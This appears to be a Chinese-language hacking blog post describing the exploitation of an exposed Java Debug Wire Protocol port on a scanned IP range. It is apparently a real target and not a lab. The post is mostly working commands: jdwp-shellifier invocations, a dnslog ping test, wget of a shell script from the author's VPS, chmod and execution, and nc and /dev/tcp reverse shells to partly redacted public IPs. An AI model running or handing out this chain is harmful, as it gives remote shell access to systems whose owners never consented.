# 0x01 打点发现
nmap扫描某ip的C段，用时大概19h，对识别到的指纹信息依次查看，查看到如下信息
```
5005/tcp  open  jdwp       Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_191
|_jdwp-info: ERROR: Script execution failed (use -d to debug)
```
之前复现过JDWP的漏洞，故有此文

# 0x02 简单验证
telnet 106.53.xx.xx 5005  
返回JDWP-Handshake，即表示存在漏洞  
我这边没有返回JDWP-Handshake，不管它，继续尝试利用  
# 0x03 dnslog测试
1、先打个dnslog试试水  
POC下载地址：https://github.com/IOActive/jdwp-shellifier  
执行如下命令  
```
python2 jdwp-shellifier.py -t 192.168.3.118 -p 8787 --break-on "java.lang.String.indexof" --cmd "ping xx.dnslog.cn"
```
dnslog平台成功收到回显，感觉有戏  
# 0x04 尝试反弹shell  
将如下内容保存为shell.txt，放置到vps下，并通过python3开启一个临时的http服务器
```
nc 192.168.178.129 3333 | /bin/bash | nc 192.168.178.129 4444%
```
开启监听，需要开启2个监听，前面一个输入执行命令，后面一个输出命令执行结果
```
这里要注意，阿里云的vps开启nc监听，需要加个选项n，否则会报错

nc -lnvvp 3333
nc -lnvvp 4444
```
利用POC执行下载shell、对文件赋予可执行权限、执行shell
```
python2 jdwp-shellifier.py -t 192.168.178.128 -p 8000 --break-on "java.lang.String.indexof" --cmd "wget http://192.168.178.129:8000/shell.txt -O /tmp/shell.sh"
python2 jdwp-shellifier.py -t 192.168.178.128 -p 8000 --break-on "java.lang.String.indexof" --cmd "chmod a+x /tmp/shell.sh"
python2 jdwp-shellifier.py -t 192.168.178.128 -p 8000 --break-on "java.lang.String.indexof" --cmd "/tmp/shell.sh"
```
成功执行完，vps上并没有收到反弹回来的shell  
思考了一下，payload中使用nc连接vps，目标可能不存在nc，改用sh，修改shell.txt为如下
```
sh -i >& /dev/tcp/101.200.xx.xx/3333 0>&1 | /bin/sh | sh -i >& /dev/tcp/101.200.xx.xx/4444 0>&1%
```
成功接收到反弹shell，如下图  
![image](./pic/1.png)

# 0x05 参考链接：  
https://blog.csdn.net/weixin_43486390/article/details/114259762  
